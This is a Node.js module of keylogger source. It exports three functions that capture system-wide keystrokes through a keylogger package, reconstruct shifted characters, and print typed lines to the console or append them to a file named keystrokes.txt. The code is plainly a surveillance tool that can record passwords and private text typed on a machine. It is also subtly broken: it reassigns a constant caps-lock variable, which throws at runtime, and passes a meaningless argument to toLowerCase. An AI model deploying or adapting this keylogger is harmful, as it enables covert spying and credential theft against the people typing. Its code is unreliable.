const keylogger = require('keylogger.js');
const cmk = require("control-modifier-keys");
const fs = require('fs')


let word = []
let shift = false

const logEverything = () => {
    keylogger.start((key, isKeyUp, keyCode) => {
        // Get the state of Caps lock
        const capsLockState = cmk.getModifierState("capslock");

        //console.log(event);
        if (!isKeyUp && (keyCode == 160 || keyCode == 161)) {
            shift = true
        } else if (isKeyUp && (keyCode == 160 || keyCode == 161)) {
            shift = false
        } else if (isKeyUp && keyCode == 20) {
            capsLockState = !capsLockState
        } else if (isKeyUp) {
            if (shift) {
                if (key == '`') key = '~'
                if (key == '1') key = '!'
                if (key == '2') key = '@'
                if (key == '3') key = '#'
                if (key == '4') key = '$'
                if (key == '5') key = '%'
                if (key == '6') key = '^'
                if (key == '7') key = '&'
                if (key == '8') key = '*'
                if (key == '9') key = '('
                if (key == '0') key = ')'
                if (key == '-') key = '_'
                if (key == '=') key = '+'
                if (key == '[') key = '{'
                if (key == ']') key = '}'
                if (key == '\\') key = '|'
            }
            if (capsLockState == false && !shift) {
                key = key.toLowerCase('/^[a-zA-Z]*$/')
            }
            //word.push(key)
            console.log({ key, keyCode, isKeyUp });
            //return { key, keyCode, isKeyUp }
        }
    });
}


const logStatements = () => {
    keylogger.start((key, isKeyUp, keyCode) => {
        // Get the state of Caps lock
        const capsLockState = cmk.getModifierState("capslock");

        //console.log(event);
        if (!isKeyUp && (keyCode == 160 || keyCode == 161)) {
            shift = true
        } else if (isKeyUp && (keyCode == 160 || keyCode == 161)) {
            shift = false
        } else if (isKeyUp && keyCode == 20) {
            capsLockState = !capsLockState
        } else if (isKeyUp && keyCode == 32) {
            key = ' '
            word.push(key)
        } else if (isKeyUp) {
            if (shift) {
                if (key == '`') key = '~'
                if (key == '1') key = '!'
                if (key == '2') key = '@'
                if (key == '3') key = '#'
                if (key == '4') key = '$'
                if (key == '5') key = '%'
                if (key == '6') key = '^'
                if (key == '7') key = '&'
                if (key == '8') key = '*'
                if (key == '9') key = '('
                if (key == '0') key = ')'
                if (key == '-') key = '_'
                if (key == '=') key = '+'
                if (key == '[') key = '{'
                if (key == ']') key = '}'
                if (key == '\\') key = '|'
            }
            if (capsLockState == false && !shift) {
                key = key.toLowerCase('/^[a-zA-Z]*$/')
            }
            word.push(key)
        }

        let withoutCommas = word.join('')
        if (keyCode === 13) {
            console.log(`${withoutCommas}`);
            word = []
        }
        //return withoutCommas
    });
}

const logToFile = () => {
    keylogger.start((key, isKeyUp, keyCode) => {
        // Get the state of Caps lock
        const capsLockState = cmk.getModifierState("capslock");

        //console.log(event);
        if (!isKeyUp && (keyCode == 160 || keyCode == 161)) {
            shift = true
        } else if (isKeyUp && (keyCode == 160 || keyCode == 161)) {
            shift = false
        } else if (isKeyUp && keyCode == 20) {
            capsLockState = !capsLockState
        } else if (isKeyUp && keyCode == 32) {
            key = ' '
            word.push(key)
        } else if (isKeyUp) {
            if (shift) {
                if (key == '`') key = '~'
                if (key == '1') key = '!'
                if (key == '2') key = '@'
                if (key == '3') key = '#'
                if (key == '4') key = '$'
                if (key == '5') key = '%'
                if (key == '6') key = '^'
                if (key == '7') key = '&'
                if (key == '8') key = '*'
                if (key == '9') key = '('
                if (key == '0') key = ')'
                if (key == '-') key = '_'
                if (key == '=') key = '+'
                if (key == '[') key = '{'
                if (key == ']') key = '}'
                if (key == '\\') key = '|'
            }
            if (capsLockState == false && !shift) {
                key = key.toLowerCase('/^[a-zA-Z]*$/')
            }
            word.push(key)
        }

        let withoutCommas = word.join('')
        if (keyCode === 13) {
            console.log(`${withoutCommas}`);
            fs.appendFileSync('keystrokes.txt', withoutCommas)
            word = []
        }
        //return withoutCommas
    });
}

module.exports = {
    logEverything,
    logStatements,
    logToFile
} 